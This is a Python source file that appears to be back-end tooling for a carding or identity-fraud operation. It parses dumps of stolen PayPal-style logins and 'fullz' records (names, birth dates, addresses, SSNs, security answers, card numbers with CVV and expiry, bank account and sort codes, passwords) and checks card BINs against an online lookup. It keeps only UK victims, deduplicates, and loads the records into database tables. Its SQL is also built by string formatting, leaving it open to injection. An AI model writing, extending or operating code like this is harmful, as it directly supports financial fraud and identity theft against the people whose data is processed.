import requests
from mycrypt import encrypt, decrypt
from myfilter import FilterModule
from mydatabase import conn, query_conn
import time

# Import module
# pp | fullz | dead_fullz

class ImportModule:
	# init
	def __init__(self, filename="", import_type="", insert_table=True):
		try:
			self.filter = FilterModule()
			self.filename = filename
			self.import_type = import_type.lower()
			self.insert_table = insert_table
		except Exception as e:
			print('ImportModule init has any errors.')
			print(e)

	# set filename & import_type
	def set_file_type(self, filename, import_type):
		self.filename = filename
		self.import_type = import_type.lower()

	# get file content
	def get_file_content(self):
		try:
			with open(self.filename, "r") as open_file:
				return list(open_file)
		except Exception as e:
			print('ImportModule file opening has any errors.')
			print(e)

	# imoport pp
	def import_pp(self, table_name = 'pp'):
		try:
			pp_data_list = self.get_file_content()

			for index, data in enumerate(pp_data_list):
				try:
					if data.index("Email: ") >= 0:
						id, email, password, ip, location, user_agent, browser, platform = pp_data_list[index-1], pp_data_list[index], pp_data_list[index+1], pp_data_list[index+3], pp_data_list[index+4], pp_data_list[index+5], pp_data_list[index+6], pp_data_list[index+7]

						ip_address = ip.replace("| IP Address : ", "").replace("\n", "")
						eml = email.replace("| Email: ", "").replace("\n", "")
						paswd = password.replace("| Password : ", "").replace("\n", "")
						locat = location.replace("| Location: ", "").replace("\n", "")
						print('---  %s  ---' % eml)

						email, password, ip, location, user_agent, browser, platform = encrypt(email).decode('utf-8'), encrypt(password).decode('utf-8'), encrypt(ip).decode('utf-8'), encrypt(location).decode('utf-8'), encrypt(user_agent).decode('utf-8'), encrypt(browser).decode('utf-8'), encrypt(platform).decode('utf-8')

						# print('before check')
						#check
						self.filter.set_badword_mode('Not Equal')
						check = self.filter.check_word([eml, paswd])
						if check == 'EXIST_BAD_WORD':
							print('%s has bad word' % eml)
							continue

						check = self.filter.check_location(locat)
						if check == 'NOT_UK':
							print('%s is not in United Kingdom' % eml)
							continue

						check, index = self.filter.check_ip(ip_address, table_name)
						if check == 'EXIST_IN_FULLZ' or check == 'EXIST_IN_PP':
							print('%s exist in pp or fullz' % eml)
							continue

						# print('before query')
						# get id & query
						try:
							id = int(id.replace("| id : ", "").replace("\n", ""), 10)
							query = "insert into `%s` (`id`, `email`, `password`, `ip_address`, `location`, `user_agent`, `browser`, `platform`) values ('%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s')" % (table_name, id, email, password, ip, location, user_agent, browser, platform)
						except:
							id = ''
							query = "insert into `%s` (`email`, `password`, `ip_address`, `location`, `user_agent`, `browser`, `platform`) values ('%s', '%s', '%s', '%s', '%s', '%s', '%s')" % (table_name, email, password, ip, location, user_agent, browser, platform)

						# print(query)
						query_conn.execute(query)
						conn.commit()
						insert_count = query_conn.rowcount

						print("type=%s, id = %s, insert cont = %s -> Success" % (table_name, id, insert_count))
				except:
					# print('substring not found. index=%s, type=%s' % (index, table_name))
					pass
		except Exception as e:
			print('ImportModule import %s method has any errors.' % table_name)
			print(e)

	# imoport fullz
	def import_fullz(self, table_name = 'fullz'):
		try:
			fullz_data_list = self.get_file_content()

			for index, data in enumerate(fullz_data_list):
				try:
					if data.index("Card BIN : ") >= 0:
						id, full_name, birth_date, address, zip, country, phone, ssn, secu_question, secu_answer, card_bin, card_bank, card_type, card_number, expire_date, cvv, account_number, sortcode, user_name, password, ip, location, user_agent, browser, platform = fullz_data_list[index-12], fullz_data_list[index-11], fullz_data_list[index-10], fullz_data_list[index-9], fullz_data_list[index-8], fullz_data_list[index-7], fullz_data_list[index-6], fullz_data_list[index-5], fullz_data_list[index-4], fullz_data_list[index-3], fullz_data_list[index], fullz_data_list[index+1], fullz_data_list[index+2], fullz_data_list[index+3], fullz_data_list[index+4], fullz_data_list[index+5], fullz_data_list[index+6], fullz_data_list[index+7], fullz_data_list[index+10], fullz_data_list[index+11], fullz_data_list[index+14], fullz_data_list[index+15], fullz_data_list[index+16], fullz_data_list[index+17], fullz_data_list[index+18]

						ip_address = ip.replace("| IP Address : ", "").replace("\n", "")
						card = card_number.replace("| Card Number : ", "").replace("\n", "")
						fullname = full_name.replace("| Full name : ", "").replace("\n", "")
						addres = address.replace("| Address : ", "").replace("\n", "")
						security_answer = secu_answer.replace("| Security Answer : ", "").replace("\n", "")
						locat = location.replace("| Location: ", "").replace("\n", "")
						print('---  %s  ---' % fullname)

						# 1s sleep
						time.sleep(5)

						bin1 = card_bin.replace("| Card BIN : ", "").replace("\n", "")
						# print('<--- bin : %s' % bin1)
						url = "https://lookup.binlist.net/" + bin1
						bin_data = requests.get(url)
						# print('bin : %s --->' % bin_data)
						bin_data = bin_data.json()
						type = bin_data['type']
						type = encrypt(type).decode('utf-8')
						full_name, birth_date, address, zip, country, phone, ssn, secu_question, secu_answer, card_bin, card_bank, card_type, card_number, expire_date, cvv, account_number, sortcode, user_name, password, ip, location, user_agent, browser, platform = encrypt(full_name).decode('utf-8'), encrypt(birth_date).decode('utf-8'), encrypt(address).decode('utf-8'), encrypt(zip).decode('utf-8'), encrypt(country).decode('utf-8'), encrypt(phone).decode('utf-8'), encrypt(ssn).decode('utf-8'), encrypt(secu_question).decode('utf-8'), encrypt(secu_answer).decode('utf-8'), encrypt(card_bin).decode('utf-8'), encrypt(card_bank).decode('utf-8'), encrypt(card_type).decode('utf-8'), encrypt(card_number).decode('utf-8'), encrypt(expire_date).decode('utf-8'), encrypt(cvv).decode('utf-8'), encrypt(account_number).decode('utf-8'), encrypt(sortcode).decode('utf-8'), encrypt(user_name).decode('utf-8'), encrypt(password).decode('utf-8'), encrypt(ip).decode('utf-8'), encrypt(location).decode('utf-8'), encrypt(user_agent).decode('utf-8'), encrypt(browser).decode('utf-8'), encrypt(platform).decode('utf-8')

						# print('before check')
						# check
						self.filter.set_badword_mode('Equal')
						check = self.filter.check_word([fullname, addres, security_answer])
						if check == 'EXIST_BAD_WORD':
							print('%s has bad word' % fullname)
							continue

						check = self.filter.check_location(locat)
						if check == 'NOT_UK':
							print('%s is not in United Kingdom' % fullname)
							continue

						check = self.filter.check_card(card)
						if check == 'EXIST_IN_FULLZ':
							print('%s exist in fullz' % fullname)
							continue

						check, idx = self.filter.check_ip(ip_address, table_name)
						if check == 'EXIST_IN_FULLZ':
							print('%s exist in fullz' % fullname)
							continue
						elif check == 'EXIST_IN_PP':
							self.filter.delete_row('pp', idx)
							print('%s exist in pp' % idx)

						# print('before query')
						# get id & query
						try:
							id = int(id.replace("| id : ", "").replace("\n", ""), 10)
							query = "insert into `%s` (`id`, `full_name`, `birth_date`, `address`, `zip`, `country`, `phone`, `ssn`, `secu_question`, `secu_answer`, `card_bin`, `card_bank`, `card_type`, `card_number`, `expire_date`, `cvv`, `account_number`, `sortcode`, `user_name`, `password`, `ip_address`, `location`, `user_agent`, `browser`, `platform`, `type`) values ('%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s')" % (table_name, id, full_name, birth_date, address, zip, country, phone, ssn, secu_question, secu_answer, card_bin, card_bank, card_type, card_number, expire_date, cvv, account_number, sortcode, user_name, password, ip, location, user_agent, browser, platform, type)
						except:
							id = ''
							query = "insert into `%s` (`full_name`, `birth_date`, `address`, `zip`, `country`, `phone`, `ssn`, `secu_question`, `secu_answer`, `card_bin`, `card_bank`, `card_type`, `card_number`, `expire_date`, `cvv`, `account_number`, `sortcode`, `user_name`, `password`, `ip_address`, `location`, `user_agent`, `browser`, `platform`, `type`) values ('%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s')" % (table_name, full_name, birth_date, address, zip, country, phone, ssn, secu_question, secu_answer, card_bin, card_bank, card_type, card_number, expire_date, cvv, account_number, sortcode, user_name, password, ip, location, user_agent, browser, platform, type)

						# print(query)
						query_conn.execute(query)
						conn.commit()
						insert_count = query_conn.rowcount

						print("type=%s, id = %s, insert cont = %s -> Success" % (table_name, id, insert_count))
				except:
					# print('substring not found. index=%s, type=%s' % (index, table_name))
					pass
		except Exception as e:
			print('ImportModule import %s method has any errors.' % table_name)
			print(e)

	# import dead_fullz
	def import_dead_fullz(self):
		self.import_fullz('dead_fullz')

	# imoport data via import_type
	def import_data(self):
		try:
			if self.import_type == 'pp':
				self.import_pp()
			if self.import_type == 'fullz':
				self.import_fullz()
			if self.import_type == 'dead_fullz':
				self.import_dead_fullz()
		except Exception as e:
			print('ImportModule import data has any errors.')
			print(e)


# define main
def main():
	print('--- my import main is running. ---')

	# Import module
	import_module = ImportModule()

	# Fullz import
	# import_module.set_file_type('fullz.txt', 'Fullz')
	# import_module.import_data()
	
	# PP import
	import_module.set_file_type('pp.txt', 'PP')
	import_module.import_data()
	
	# dead_fullz import
	# import_module.set_file_type('dead_fullz.txt', 'dead_fullz')
	# import_module.import_data()


# call main
if __name__ == "__main__":
    main()